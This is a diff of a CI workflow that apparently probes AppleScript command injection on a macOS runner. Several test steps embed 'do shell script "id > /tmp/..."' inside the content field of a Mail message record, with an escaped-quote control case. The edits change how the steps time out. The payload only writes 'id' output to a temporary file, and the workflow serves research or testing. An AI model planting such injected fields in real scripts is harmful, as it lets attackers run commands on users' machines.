@@ -14,47 +14,51 @@ jobs:
         run: |
           set +e
           rm -f /tmp/t0
-          timeout 20 osascript -e 'do shell script "id > /tmp/t0"'
+          osascript -e 'do shell script "id > /tmp/t0"'
           echo "exit=$?"
           echo "T0=[$(cat /tmp/t0 2>/dev/null)]"
 
-      - name: T1 injection inside a record, no Mail
+      - name: T1 injection inside a record no Mail
         run: |
           set +e
           rm -f /tmp/t1
           printf '%s\n' 'set r to {subject:"Invoice", content:"x" & do shell script "id > /tmp/t1" & "" & linefeed & linefeed}' > t1.scpt
           nl -ba t1.scpt
-          timeout 25 osascript t1.scpt
+          osascript t1.scpt
           echo "exit=$?"
           echo "T1=[$(cat /tmp/t1 2>/dev/null)]"
 
-      - name: T2 control escaped quote, no Mail
+      - name: T2 control escaped quote no Mail
         run: |
           set +e
           rm -f /tmp/t2
           printf '%s\n' 'set r to {subject:"Invoice", content:"x\" & do shell script \"id > /tmp/t2\" & \"" & linefeed & linefeed}' > t2.scpt
           nl -ba t2.scpt
-          timeout 25 osascript t2.scpt
+          osascript t2.scpt
           echo "exit=$?"
           echo "T2=[$(cat /tmp/t2 2>/dev/null)]"
 
-      - name: T3 Mail record bounded timeout
+      - name: T3 Mail record with internal timeout
         run: |
           set +e
           rm -f /tmp/t3
           printf '%s\n' 'with timeout of 8 seconds' 'tell application "Mail"' 'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x" & do shell script "id > /tmp/t3" & "" & linefeed & linefeed}' 'end tell' 'end timeout' > t3.scpt
           nl -ba t3.scpt
           osacompile -o /tmp/t3c.scpt t3.scpt && echo "T3 COMPILE OK" || echo "T3 COMPILE FAILED"
-          timeout 40 osascript t3.scpt
-          echo "exit=$?"
+          osascript t3.scpt &
+          PID=$!
+          for i in $(seq 1 30); do kill -0 $PID 2>/dev/null || break; sleep 1; done
+          kill $PID 2>/dev/null
           echo "T3=[$(cat /tmp/t3 2>/dev/null)]"
 
-      - name: T4 Mail scriptability on this runner
+      - name: T4 Mail version bounded
         run: |
           set +e
-          ls -d /System/Applications/Mail.app 2>/dev/null && echo "Mail.app present" || echo "Mail.app MISSING"
-          timeout 30 osascript -e 'tell application "Mail" to get version'
-          echo "exit=$?"
+          ls -d /System/Applications/Mail.app >/dev/null 2>&1 && echo "Mail.app present" || echo "Mail.app MISSING"
+          osascript -e 'tell application "Mail" to get version' &
+          PID=$!
+          for i in $(seq 1 20); do kill -0 $PID 2>/dev/null || break; sleep 1; done
+          kill $PID 2>/dev/null
           pgrep -x Mail >/dev/null && echo "Mail running" || echo "Mail not running"
 
       - name: Collect
